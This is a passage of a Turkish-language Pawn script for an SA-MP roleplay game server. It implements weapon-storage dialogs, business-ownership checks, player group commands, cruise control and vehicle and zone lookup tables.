			sid = cache_get_field_content_int(i, "silahID");
			mermis = cache_get_field_content_int(i, "mermi");
			_no = cache_get_field_content_int(i, "no");
		    switch(sid)
		    {
		        case 0: silahisim1 = "Boþ";
		        case 1: silahisim1 = "Muþta";
		        case 2: silahisim1 = "Golf Sopasý";
		        case 3: silahisim1 = "Cop";
		        case 4: silahisim1 = "Býçak";
		        case 5: silahisim1 = "Beyzbol Sopasý";
		        case 6: silahisim1 = "Kürek";
		        case 7: silahisim1 = "Bilardo Sopasý";
		        case 8: silahisim1 = "Katana";
		        case 9: silahisim1 = "Testere";
		        case 10: silahisim1 = "Mor Dildo";
		        case 11: silahisim1 = "Küçük Beyaz Vibrator";
		        case 12: silahisim1 = "Büyük Beyaz Vibrator";
		        case 13: silahisim1 = "Gümüþ Vibrator";
		        case 14: silahisim1 = "Çiçek Demeti";
		        case 15: silahisim1 = "Baston";
		        case 16: silahisim1 = "El Bombasý";
		        case 17: silahisim1 = "Sis Bombasý";
		        case 18: silahisim1 = "Molotof";
		        case 22: silahisim1 = "Pistol";
		        case 23: silahisim1 = "Susturuculu Pistol";
		        case 24: silahisim1 = "Desert Eagle";
		        case 25: silahisim1 = "Shotgun";
		        case 26: silahisim1 = "Sawn-off Shotgun";
		        case 27: silahisim1 = "Combat Shotgun";
		        case 28: silahisim1 = "Micro SMG";
		        case 29: silahisim1 = "Mp5";
		        case 30: silahisim1 = "AK47";
		        case 31: silahisim1 = "M4";
		        case 32: silahisim1 = "Tec9";
		        case 33: silahisim1 = "Country Rifle";
		        case 34: silahisim1 = "Sniper Rifle";
		        case 35: silahisim1 = "Rocket Launcher";
		        case 36: silahisim1 = "HS Rocket Launcher";
		        case 37: silahisim1 = "Flamethrower";
		        case 38: silahisim1 = "Minigun";
		        case 39: silahisim1 = "Satchel Charge";
		        case 41: silahisim1 = "Spraycan";
		        case 42: silahisim1 = "Yangýn Söndürücü Tüp";
		        case 43: silahisim1 = "Kamera";
		        case 46: silahisim1 = "Paraþüt";
			}
	    	format(mstring,sizeof(mstring),"%s%d\t%s[%d]\t%d\n",mstring,_no,silahisim1,sid,mermis);
	}
	cache_delete(cache);
	format(mstring,sizeof(mstring),"NO\tSilah Adý\tMermi\n%s",mstring);
	ShowPlayerDialog(playerid, 234, DIALOG_STYLE_TABLIST_HEADERS,""C7"EIGHTBORN - "C8"Araç Silah Al", mstring, "Al", "Ýptal");
	return 1;
}
IsyeriYetkilisi(playerid, isyeridd)
{
	if(Karakter[playerid][sqlid] == Isyeri[isyeridd][isahip] || Karakter[playerid][sqlid] == Isyeri[isyeridd][ortak]) return 1;
	for(new i;i<10;i++)
	{
	    if(Karakter[playerid][sqlid] == Isyeri[isyeridd][isci][i]) return 1;
	}
	return 0;
}
IsyeriSahibi(playerid, isyeridd)
{
	if(Karakter[playerid][sqlid] == Isyeri[isyeridd][isahip] || Karakter[playerid][sqlid] == Isyeri[isyeridd][ortak]) return 1;
	return 0;
}
CMD:g(playerid, params[])
{
	if(Girdi[playerid])
	{
	    new mstring[128],string[180];
		if(Karakter[playerid][grup] == 0) return Hata(playerid, "Herhangi bir gruba üye deðilsiniz.");
		if(sscanf(params,"s[128]",mstring)) return Kullanim(playerid, "/g [yazi]");
  		format(string,sizeof(string),"{008080}[GRUP] %s: {FFFFFF}%s ",OyuncuAdiniBul(playerid),mstring);
  		if(Grup[Karakter[playerid][grup]][lider] == Karakter[playerid][sqlid]) format(string,sizeof(string),"{008080}[GRUP] %s"C1"[Lider]{008080}: {FFFFFF}%s ",OyuncuAdiniBul(playerid),mstring);
		foreach(new i : Player)
		{
			if(Karakter[i][grup] == Karakter[playerid][grup] && Girdi[i])
			{
				SendClientMessage(i,0xD1BD2EFF,string);
			}
		}
	}
	return 1;
}
CMD:gaktif(playerid, params[])
{
	if(Girdi[playerid])
	{
	    if(Karakter[playerid][grup] == 0) return Hata(playerid, "Herhangi bir gruba üye deðilsiniz.");
   		SendClientMessage(playerid, COLOR_YELLOW3, "Aktif Grup Üyeleri:");
     	new total=0;
	    foreach(new i : Player)
	    {
     		if(Girdi[i])
	        {
	        	if(Karakter[i][grup] == Karakter[playerid][grup])
	            {
	            	total += 1;
	                new metin[128];
	                format(metin,sizeof(metin),"%s[%d]", OyuncuAdiniBul(i), i);
	                if(Grup[Karakter[playerid][grup]][lider] == Karakter[i][sqlid]) format(metin,sizeof(metin),"%s[%d] - Lider", OyuncuAdiniBul(i), i);
	                SendClientMessage(playerid, COLOR_GREY, metin);

	            }
			}
		}
		if(total == 0)
		{
		    SendClientMessage(playerid, COLOR_GREY, "Aktif grup üyesi yok.");
		}
	}
	return 1;
}
CMD:grup(playerid, params[])
{
	if(Girdi[playerid])
	{
		new mstring[128],nstring[32];
		if(isnull(params)) return Kullanim(playerid, "/grup [fonksiyon]"),SendClientMessage(playerid, -1, "{AFAFAF}Geçerli fonksiyonlar: kur, duzenle, yardim, cik");
        sscanf(params,"s[128]s[32]",mstring,nstring);
		if(Buysa("yardim",mstring))
		{
		    format(mstring, sizeof(mstring), ""C2"[GRUP]");
		    SendClientMessage(playerid, BIZIMYESIL, mstring);
		    SendClientMessage(playerid, COLOR_WHITE, "/g - /grup - /gaktif");
		}
		else if(Buysa("kur",mstring))
		{
		    if(Karakter[playerid][level] < 3) return Hata(playerid, "Grup kurmak için yeterli seviyeniz yok.[3 seviye]");
		    if(Karakter[playerid][grup] != 0) return Hata(playerid, "Zaten bir gruba üyesiniz.");
			if(isnull(nstring)) return Kullanim(playerid, "/grup kur [grup ismi]");
			new query[256];
			format(query,sizeof(query),"INSERT INTO `gruplar` (`Lider`,`isim`) VALUES ('%d','%s')",Karakter[playerid][sqlid],EscapeString(nstring));
			new Cache:cache = mysql_query(query,true);
			new i = cache_insert_id();
			cache_delete(cache);
			format(Grup[i][gisim], 32, "%s", nstring);
			Grup[i][lider] = Karakter[playerid][sqlid];
			format(query, sizeof(query), "Baþarýyla grup kurdunuz.(ID:%d, Lider:%s, Ýsim:%s)",i,SQLFromName(Karakter[playerid][sqlid]),nstring);
			Bilgi(playerid, query);
			Karakter[playerid][grup] = i;
		}
		else if(Buysa("duzenle",mstring))
		{
		    if(Karakter[playerid][grup] == 0) return Hata(playerid, "Herhangi bir gruba üye deðilsiniz.");
			if(Karakter[playerid][sqlid] != Grup[Karakter[playerid][grup]][lider]) return Hata(playerid, "Grubun lideri deðilsiniz.");
			GrupMenu(playerid);
		}
		else if(Buysa("cik",mstring))
		{
		    if(Karakter[playerid][grup] == 0) return Hata(playerid, "Herhangi bir gruba üye deðilsiniz.");
			if(Karakter[playerid][sqlid] != Grup[Karakter[playerid][grup]][lider])
			{
			    format(mstring, sizeof(mstring), "Baþarýyla %s isimli gruptan çýktýnýz.",Grup[Karakter[playerid][grup]][gisim]);
			    Bilgi(playerid,mstring);
			    Karakter[playerid][grup] = 0;
			}
			else
			{
				if(isnull(nstring)) return Kullanim(playerid, "/grup cik [onayla]"),Ipucu(playerid, "Gruptan çýkarsanýz grup silinecektir.");
				if(Buysa("onayla",nstring))
				{
				    format(mstring, sizeof(mstring), "Baþarýyla %s isimli grubu sildiniz.",Grup[Karakter[playerid][grup]][gisim]);
			    	Bilgi(playerid,mstring);
					format(mstring, sizeof(mstring), "UPDATE `karakterler` SET `grup` = '0' WHERE `grup` = '%d'",Karakter[playerid][grup]);
					mysql_tquery(1,mstring);
					format(mstring, sizeof(mstring), "DELETE FROM `gruplar` WHERE `ID` = '%d'",Karakter[playerid][grup]);
					mysql_tquery(1,mstring);
					strdel(Grup[Karakter[playerid][grup]][gisim], 0, strlen(Grup[Karakter[playerid][grup]][gisim]));
					Grup[Karakter[playerid][grup]][gid] = 0;
					Grup[Karakter[playerid][grup]][lider] = 0;
    				foreach(new i : Player)
			    	{
			    		Karakter[i][grup] = 0;
					}
				}
			}
		}
	}
	return 1;
}
GirdiSil(playerid)
{
	new query[128];
	format(query, sizeof(query), "UPDATE `karakterler` SET `girdi` = '0' WHERE `id` = '%d'",Karakter[playerid][sqlid]);
	mysql_tquery(1,query);
}
GirdiYarat(playerid)
{
    new query[128];
	format(query, sizeof(query), "UPDATE `karakterler` SET `girdi` = '1' WHERE `id` = '%d'",Karakter[playerid][sqlid]);
	mysql_tquery(1,query);
}
GrupMenu(playerid)
{
	new onlinesayi = 0,mstring[512];
	foreach(new i : Player)
	{
	    if(Karakter[i][grup] == Karakter[playerid][grup])
	    {
     		onlinesayi++;
	    }
	}
	format(mstring, sizeof(mstring), "Grup\t{B3B3B3}%s\t\t[{FFFFFF}%d{B3B3B3}]\nGrup\t{B3B3B3}Online\t\t[{FFFFFF}%d{B3B3B3}]\nGrup\t{B3B3B3}Davet Et",Grup[Karakter[playerid][grup]][gisim], Grup[Karakter[playerid][grup]][gid], onlinesayi);
	ShowPlayerDialog(playerid, 236, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Grup", mstring, "Seç", "Ýptal");
}
GrupKaydet(grid)
{
	new query[386];
	format(query, sizeof(query), "UPDATE `gruplar` SET `isim` = '%s' WHERE `id` = '%d'",EscapeString(Grup[grid][gisim]),Grup[grid][gid]);
	mysql_tquery(1,query);
}
DistanceFlat(Float:aax, Float:_aay, Float:bbx,Float:bby, &Float:distance2)
{
    distance2 = floatsqroot(floatpower(bbx-aax,2)+floatpower(bby-_aay,2));
	return floatround(distance2);
}
forward CruiseControl(playerid);
public CruiseControl(playerid)
{
    	new vid = GetPlayerVehicleID(playerid);
    	new Float:x, Float:y, Float:z;
        GetVehicleVelocity(vid, x, y, z);

        new keys, ud, lr;
        GetPlayerKeys(playerid, keys, ud, lr);

        new Float:angle, Float:heading, Float:speed;
        GetVehicleZAngle(vid, angle);
        GetVehicleHeadingAngle(vid, heading);
        DistanceFlat(0, 0, x, y, speed);


        if (!(keys & CCKey) || PlayerCruiseSpeed[playerid] == 0.00 || //If player released LCTRL or CruiseSpeed got cancelled by other means (spacebar press)
        GetPlayerState(playerid) != PLAYER_STATE_DRIVER ||
        (speed < 0.7 * PlayerCruiseSpeed[playerid]) || //if player slowed down too much
        z > 1 || //if car is going upwards too fast
        (floatabs(angle - heading) > 50 && floatabs(angle - heading) < 310))//if vehicle goes sideways
        {                                   //Cruise control will turn off:
            PlayerCruiseSpeed[playerid] = 0.00;
            Bilgi(playerid, "Hýz sabitleme pasif."); // === Remove this if not needed ===
            return false;
        }
        GetVehicleZAngle(vid, PlayerHeadingAngle[playerid]);
        GetXYVelocity(vid, x, y, PlayerCruiseSpeed[playerid]);
        SetVehicleVelocity(vid, x, y, z);
        return SetTimerEx("CruiseControl", 500, false, "d", playerid);
}
GetXYVelocity(vehicleid, &Float:x, &Float:y, Float:speed)
{
        new Float:a;
        x = 0.0;
        y = 0.0;
        GetVehicleZAngle(vehicleid, a);
        x += (speed * floatsin(-a, degrees));
        y += (speed * floatcos(-a, degrees));
}

GetAngleToXY(Float:X, Float:Y, Float:CurrentX, Float:CurrentY, &Float:Angle)
{
    Angle = atan2(Y-CurrentY, X-CurrentX);
    Angle = floatsub(Angle, 90.0);
    if(Angle < 0.0) Angle = floatadd(Angle, 360.0);
}

GetVehicleHeadingAngle(vehicleid, &Float:a)
{
        new Float:x, Float:y, Float:z;
        GetVehicleVelocity(vehicleid, x, y, z);
        GetAngleToXY(x, y, 0, 0, a);
}
stock GetSkinModelName(skinid, name[], namesize)
{
	if(-1 < skinid < 312)
	{
		memcpy(name, SkinNames[skinid], 0, namesize * 4, namesize);
		return 1;
	}
	return 0;
}
GetSkinModelNameEx(skinid)
{
	new _name[32];
	_name="-";
	if(-1 < skinid < 312)
	{
		format(_name, sizeof(_name), "%s", SkinNames[skinid]);
	}
	return _name;
}
FlipVehicle(vehicleid)
{
	new
	    Float:fAngle;

	GetVehicleZAngle(vehicleid, fAngle);

	SetVehicleZAngle(vehicleid, fAngle);
	SetVehicleVelocity(vehicleid, 0.0, 0.0, 0.0);
}
PlayReloadAnimation(playerid, weaponid)
{
    switch (weaponid)
    {
        case 22: ApplyAnimation(playerid, "COLT45", "colt45_reload", 4.0, 0, 0, 0, 0, 0);
        case 23: ApplyAnimation(playerid, "SILENCED", "Silence_reload", 4.0, 0, 0, 0, 0, 0);
        case 24: ApplyAnimation(playerid, "PYTHON", "python_reload", 4.0, 0, 0, 0, 0, 0);
        case 25, 27: ApplyAnimation(playerid, "BUDDY", "buddy_reload", 4.0, 0, 0, 0, 0, 0);
        case 26: ApplyAnimation(playerid, "COLT45", "sawnoff_reload", 4.0, 0, 0, 0, 0, 0);
        case 29..31, 33, 34: ApplyAnimation(playerid, "RIFLE", "rifle_load", 4.0, 0, 0, 0, 0, 0);
        case 28, 32: ApplyAnimation(playerid, "TEC", "tec_reload", 4.0, 0, 0, 0, 0, 0);
    }
    return 1;
}
IsWindowedVehicle(vehicleid)
{
    static const g_aWindowStatus[] = {
        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
        1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1,
        1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1,
        1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1,
        1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1,
        1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1,
        1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0,
        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
        1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1,
        1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1,
        1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0
    };
    new modelid = GetVehicleModel(vehicleid);

    if (modelid < 400 || modelid > 611)
        return 0;

    return (g_aWindowStatus[modelid - 400]);
}
IsDoorVehicleEx(modelid)
{
    switch (modelid) {
        case 400..424, 426..429, 431..440, 442..445, 451, 455, 456, 458, 459, 466, 467, 470, 474, 475:
            return 1;

        case 477..480, 482, 483, 486, 489, 490..492, 494..496, 498..500, 502..508, 514..518, 524..529, 533..536:
            return 1;

        case 540..547, 549..552, 554..562, 565..568, 573, 575, 576, 578..580, 582, 585, 587..589, 596..605, 609:
            return 1;
    }
    return 0;
}

IsDoorVehicle(vehicleid)
{
    switch (GetVehicleModel(vehicleid)) {
        case 400..424, 426..429, 431..440, 442..445, 451, 455, 456, 458, 459, 466, 467, 470, 474, 475:
            return 1;

        case 477..480, 482, 483, 486, 489, 490..492, 494..496, 498..500, 502..508, 514..518, 524..529, 533..536:
            return 1;

        case 540..547, 549..552, 554..562, 565..568, 573, 575, 576, 578..580, 582, 585, 587..589, 596..605, 609:
            return 1;

		case 448, 461..463, 468, 471, 481, 509..510, 521..523, 581, 586:
		    return 1;
    }
    return 0;
}

IsLoadableVehicle(vehicleid)
{
    new modelid = GetVehicleModel(vehicleid);

    if (GetVehicleTrailer(vehicleid))
        modelid = GetVehicleModel(GetVehicleTrailer(vehicleid));

    switch (modelid) {
        //case 609, 403, 414, 456, 498, 499, 514, 515, 435, 591: return 1;
        case 414, 440, 456, 498, 499, 609, 482: return 1;
    }
    return 0;
}
GetNearestVehicle(playerid)
{
	if(IsPlayerInAnyVehicle(playerid)) return GetPlayerVehicleID(playerid);

    static
        Float:fX,
        Float:fY,
        Float:fZ;

    for (new i = 1; i != MAX_VEHICLES; i ++) if (IsValidVehicle(i) && GetVehiclePos(i, fX, fY, fZ))
    {
        if (IsPlayerInRangeOfPoint(playerid, 4.5, fX, fY, fZ) && GetVehicleVirtualWorld(i) == GetPlayerVirtualWorld(playerid)) return i;
    }
    return INVALID_VEHICLE_ID;
}
stock IsVehicleInRangeOfPoint(vehicleid,Float:range,Float:x,Float:y,Float:z)
{
    if(vehicleid == INVALID_VEHICLE_ID) return 0;

    new Float:DistantaCar = GetVehicleDistanceFromPoint(vehicleid, x, y, z);

    if(DistantaCar <= range) return 1;
    return 0;
}
IsEngineVehicle(vehicleid)
{
    static const g_aEngineStatus[] = {
        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1,
        1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1,
        1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
        1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
        1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1,
        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1,
        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
        1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1,
        1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1,
        1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0
    };
    new modelid = GetVehicleModel(vehicleid);

    if (modelid < 400 || modelid > 611)
        return 0;

    return (g_aEngineStatus[modelid - 400]);
}

IsPlayerNearBoot(playerid, vehicleid)
{
    static
        Float:fX,
        Float:fY,
        Float:fZ;

    GetVehicleBoot(vehicleid, fX, fY, fZ);

    return (GetPlayerVirtualWorld(playerid) == GetVehicleVirtualWorld(vehicleid)) && IsPlayerInRangeOfPoint(playerid, 4.5, fX, fY, fZ);
}

GetLocation(Float:fX, Float:fY, Float:fZ)
{
    enum e_ZoneData
    {
         e_ZoneName[32 char],
         Float:e_ZoneArea[6]
    };
    new const g_arrZoneData[][e_ZoneData] =
    {
        {!"The Big Ear",                   {-410.00, 1403.30, -3.00, -137.90, 1681.20, 200.00}},
        {!"Aldea Malvada",                {-1372.10, 2498.50, 0.00, -1277.50, 2615.30, 200.00}},
        {!"Angel Pine",                   {-2324.90, -2584.20, -6.10, -1964.20, -2212.10, 200.00}},
        {!"Arco del Oeste",               {-901.10, 2221.80, 0.00, -592.00, 2571.90, 200.00}},
        {!"Avispa Country Club",          {-2646.40, -355.40, 0.00, -2270.00, -222.50, 200.00}},
        {!"Avispa Country Club",          {-2831.80, -430.20, -6.10, -2646.40, -222.50, 200.00}},
        {!"Avispa Country Club",          {-2361.50, -417.10, 0.00, -2270.00, -355.40, 200.00}},
        {!"Avispa Country Club",          {-2667.80, -302.10, -28.80, -2646.40, -262.30, 71.10}},
        {!"Avispa Country Club",          {-2470.00, -355.40, 0.00, -2270.00, -318.40, 46.10}},
        {!"Avispa Country Club",          {-2550.00, -355.40, 0.00, -2470.00, -318.40, 39.70}},
        {!"Back o Beyond",                {-1166.90, -2641.10, 0.00, -321.70, -1856.00, 200.00}},
        {!"Battery Point",                {-2741.00, 1268.40, -4.50, -2533.00, 1490.40, 200.00}},
        {!"Bayside",                      {-2741.00, 2175.10, 0.00, -2353.10, 2722.70, 200.00}},
        {!"Bayside Marina",               {-2353.10, 2275.70, 0.00, -2153.10, 2475.70, 200.00}},
        {!"Beacon Hill",                  {-399.60, -1075.50, -1.40, -319.00, -977.50, 198.50}},
        {!"Blackfield",                   {964.30, 1203.20, -89.00, 1197.30, 1403.20, 110.90}},
        {!"Blackfield",                   {964.30, 1403.20, -89.00, 1197.30, 1726.20, 110.90}},
        {!"Blackfield Chapel",            {1375.60, 596.30, -89.00, 1558.00, 823.20, 110.90}},
        {!"Blackfield Chapel",            {1325.60, 596.30, -89.00, 1375.60, 795.00, 110.90}},
        {!"Blackfield Intersection",      {1197.30, 1044.60, -89.00, 1277.00, 1163.30, 110.90}},
        {!"Blackfield Intersection",      {1166.50, 795.00, -89.00, 1375.60, 1044.60, 110.90}},
        {!"Blackfield Intersection",      {1277.00, 1044.60, -89.00, 1315.30, 1087.60, 110.90}},
        {!"Blackfield Intersection",      {1375.60, 823.20, -89.00, 1457.30, 919.40, 110.90}},
        {!"Blueberry",                    {104.50, -220.10, 2.30, 349.60, 152.20, 200.00}},
        {!"Blueberry",                    {19.60, -404.10, 3.80, 349.60, -220.10, 200.00}},
        {!"Blueberry Acres",              {-319.60, -220.10, 0.00, 104.50, 293.30, 200.00}},
        {!"Caligula's Palace",            {2087.30, 1543.20, -89.00, 2437.30, 1703.20, 110.90}},
        {!"Caligula's Palace",            {2137.40, 1703.20, -89.00, 2437.30, 1783.20, 110.90}},
        {!"Calton Heights",               {-2274.10, 744.10, -6.10, -1982.30, 1358.90, 200.00}},
        {!"Chinatown",                    {-2274.10, 578.30, -7.60, -2078.60, 744.10, 200.00}},
        {!"City Hall",                    {-2867.80, 277.40, -9.10, -2593.40, 458.40, 200.00}},
        {!"Come-A-Lot",                   {2087.30, 943.20, -89.00, 2623.10, 1203.20, 110.90}},
        {!"Commerce",                     {1323.90, -1842.20, -89.00, 1701.90, -1722.20, 110.90}},
        {!"Commerce",                     {1323.90, -1722.20, -89.00, 1440.90, -1577.50, 110.90}},
        {!"Commerce",                     {1370.80, -1577.50, -89.00, 1463.90, -1384.90, 110.90}},
        {!"Commerce",                     {1463.90, -1577.50, -89.00, 1667.90, -1430.80, 110.90}},
        {!"Commerce",                     {1583.50, -1722.20, -89.00, 1758.90, -1577.50, 110.90}},
        {!"Commerce",                     {1667.90, -1577.50, -89.00, 1812.60, -1430.80, 110.90}},
        {!"Conference Center",            {1046.10, -1804.20, -89.00, 1323.90, -1722.20, 110.90}},
        {!"Conference Center",            {1073.20, -1842.20, -89.00, 1323.90, -1804.20, 110.90}},
        {!"Cranberry Station",            {-2007.80, 56.30, 0.00, -1922.00, 224.70, 100.00}},
        {!"Creek",                        {2749.90, 1937.20, -89.00, 2921.60, 2669.70, 110.90}},
        {!"Dillimore",                    {580.70, -674.80, -9.50, 861.00, -404.70, 200.00}},
        {!"Doherty",                      {-2270.00, -324.10, -0.00, -1794.90, -222.50, 200.00}},
        {!"Doherty",                      {-2173.00, -222.50, -0.00, -1794.90, 265.20, 200.00}},
        {!"Downtown",                     {-1982.30, 744.10, -6.10, -1871.70, 1274.20, 200.00}},
        {!"Downtown",                     {-1871.70, 1176.40, -4.50, -1620.30, 1274.20, 200.00}},
        {!"Downtown",                     {-1700.00, 744.20, -6.10, -1580.00, 1176.50, 200.00}},
        {!"Downtown",                     {-1580.00, 744.20, -6.10, -1499.80, 1025.90, 200.00}},
        {!"Downtown",                     {-2078.60, 578.30, -7.60, -1499.80, 744.20, 200.00}},
        {!"Downtown",                     {-1993.20, 265.20, -9.10, -1794.90, 578.30, 200.00}},
        {!"Downtown Los Santos",          {1463.90, -1430.80, -89.00, 1724.70, -1290.80, 110.90}},
        {!"Downtown Los Santos",          {1724.70, -1430.80, -89.00, 1812.60, -1250.90, 110.90}},
        {!"Downtown Los Santos",          {1463.90, -1290.80, -89.00, 1724.70, -1150.80, 110.90}},
        {!"Downtown Los Santos",          {1370.80, -1384.90, -89.00, 1463.90, -1170.80, 110.90}},
        {!"Downtown Los Santos",          {1724.70, -1250.90, -89.00, 1812.60, -1150.80, 110.90}},
        {!"Downtown Los Santos",          {1370.80, -1170.80, -89.00, 1463.90, -1130.80, 110.90}},
        {!"Downtown Los Santos",          {1378.30, -1130.80, -89.00, 1463.90, -1026.30, 110.90}},
        {!"Downtown Los Santos",          {1391.00, -1026.30, -89.00, 1463.90, -926.90, 110.90}},
        {!"Downtown Los Santos",          {1507.50, -1385.20, 110.90, 1582.50, -1325.30, 335.90}},
        {!"East Beach",                   {2632.80, -1852.80, -89.00, 2959.30, -1668.10, 110.90}},
        {!"East Beach",                   {2632.80, -1668.10, -89.00, 2747.70, -1393.40, 110.90}},
        {!"East Beach",                   {2747.70, -1668.10, -89.00, 2959.30, -1498.60, 110.90}},
        {!"East Beach",                   {2747.70, -1498.60, -89.00, 2959.30, -1120.00, 110.90}},
        {!"East Los Santos",              {2421.00, -1628.50, -89.00, 2632.80, -1454.30, 110.90}},
        {!"East Los Santos",              {2222.50, -1628.50, -89.00, 2421.00, -1494.00, 110.90}},
        {!"East Los Santos",              {2266.20, -1494.00, -89.00, 2381.60, -1372.00, 110.90}},
        {!"East Los Santos",              {2381.60, -1494.00, -89.00, 2421.00, -1454.30, 110.90}},
        {!"East Los Santos",              {2281.40, -1372.00, -89.00, 2381.60, -1135.00, 110.90}},
        {!"East Los Santos",              {2381.60, -1454.30, -89.00, 2462.10, -1135.00, 110.90}},
        {!"East Los Santos",              {2462.10, -1454.30, -89.00, 2581.70, -1135.00, 110.90}},
        {!"Easter Basin",                 {-1794.90, 249.90, -9.10, -1242.90, 578.30, 200.00}},
        {!"Easter Basin",                 {-1794.90, -50.00, -0.00, -1499.80, 249.90, 200.00}},
        {!"Easter Bay Airport",           {-1499.80, -50.00, -0.00, -1242.90, 249.90, 200.00}},
        {!"Easter Bay Airport",           {-1794.90, -730.10, -3.00, -1213.90, -50.00, 200.00}},
        {!"Easter Bay Airport",           {-1213.90, -730.10, 0.00, -1132.80, -50.00, 200.00}},
        {!"Easter Bay Airport",           {-1242.90, -50.00, 0.00, -1213.90, 578.30, 200.00}},
        {!"Easter Bay Airport",           {-1213.90, -50.00, -4.50, -947.90, 578.30, 200.00}},
        {!"Easter Bay Airport",           {-1315.40, -405.30, 15.40, -1264.40, -209.50, 25.40}},
        {!"Easter Bay Airport",           {-1354.30, -287.30, 15.40, -1315.40, -209.50, 25.40}},
        {!"Easter Bay Airport",           {-1490.30, -209.50, 15.40, -1264.40, -148.30, 25.40}},
        {!"Easter Bay Chemicals",         {-1132.80, -768.00, 0.00, -956.40, -578.10, 200.00}},
        {!"Easter Bay Chemicals",         {-1132.80, -787.30, 0.00, -956.40, -768.00, 200.00}},
        {!"El Castillo del Diablo",       {-464.50, 2217.60, 0.00, -208.50, 2580.30, 200.00}},
        {!"El Castillo del Diablo",       {-208.50, 2123.00, -7.60, 114.00, 2337.10, 200.00}},
        {!"El Castillo del Diablo",       {-208.50, 2337.10, 0.00, 8.40, 2487.10, 200.00}},
        {!"El Corona",                    {1812.60, -2179.20, -89.00, 1970.60, -1852.80, 110.90}},
        {!"El Corona",                    {1692.60, -2179.20, -89.00, 1812.60, -1842.20, 110.90}},
        {!"El Quebrados",                 {-1645.20, 2498.50, 0.00, -1372.10, 2777.80, 200.00}},
        {!"Esplanade East",               {-1620.30, 1176.50, -4.50, -1580.00, 1274.20, 200.00}},
        {!"Esplanade East",               {-1580.00, 1025.90, -6.10, -1499.80, 1274.20, 200.00}},
        {!"Esplanade East",               {-1499.80, 578.30, -79.60, -1339.80, 1274.20, 20.30}},
        {!"Esplanade North",              {-2533.00, 1358.90, -4.50, -1996.60, 1501.20, 200.00}},
        {!"Esplanade North",              {-1996.60, 1358.90, -4.50, -1524.20, 1592.50, 200.00}},
        {!"Esplanade North",              {-1982.30, 1274.20, -4.50, -1524.20, 1358.90, 200.00}},
        {!"Fallen Tree",                  {-792.20, -698.50, -5.30, -452.40, -380.00, 200.00}},
        {!"Fallow Bridge",                {434.30, 366.50, 0.00, 603.00, 555.60, 200.00}},
        {!"Fern Ridge",                   {508.10, -139.20, 0.00, 1306.60, 119.50, 200.00}},
        {!"Financial",                    {-1871.70, 744.10, -6.10, -1701.30, 1176.40, 300.00}},
        {!"Fisher's Lagoon",              {1916.90, -233.30, -100.00, 2131.70, 13.80, 200.00}},
        {!"Flint Intersection",           {-187.70, -1596.70, -89.00, 17.00, -1276.60, 110.90}},
        {!"Flint Range",                  {-594.10, -1648.50, 0.00, -187.70, -1276.60, 200.00}},
        {!"Fort Carson",                  {-376.20, 826.30, -3.00, 123.70, 1220.40, 200.00}},
        {!"Foster Valley",                {-2270.00, -430.20, -0.00, -2178.60, -324.10, 200.00}},
        {!"Foster Valley",                {-2178.60, -599.80, -0.00, -1794.90, -324.10, 200.00}},
        {!"Foster Valley",                {-2178.60, -1115.50, 0.00, -1794.90, -599.80, 200.00}},
        {!"Foster Valley",                {-2178.60, -1250.90, 0.00, -1794.90, -1115.50, 200.00}},
        {!"Frederick Bridge",             {2759.20, 296.50, 0.00, 2774.20, 594.70, 200.00}},
        {!"Gant Bridge",                  {-2741.40, 1659.60, -6.10, -2616.40, 2175.10, 200.00}},
        {!"Gant Bridge",                  {-2741.00, 1490.40, -6.10, -2616.40, 1659.60, 200.00}},
        {!"Ganton",                       {2222.50, -1852.80, -89.00, 2632.80, -1722.30, 110.90}},
        {!"Ganton",                       {2222.50, -1722.30, -89.00, 2632.80, -1628.50, 110.90}},
        {!"Garcia",                       {-2411.20, -222.50, -0.00, -2173.00, 265.20, 200.00}},
        {!"Garcia",                       {-2395.10, -222.50, -5.30, -2354.00, -204.70, 200.00}},
        {!"Garver Bridge",                {-1339.80, 828.10, -89.00, -1213.90, 1057.00, 110.90}},
        {!"Garver Bridge",                {-1213.90, 950.00, -89.00, -1087.90, 1178.90, 110.90}},
        {!"Garver Bridge",                {-1499.80, 696.40, -179.60, -1339.80, 925.30, 20.30}},
        {!"Glen Park",                    {1812.60, -1449.60, -89.00, 1996.90, -1350.70, 110.90}},
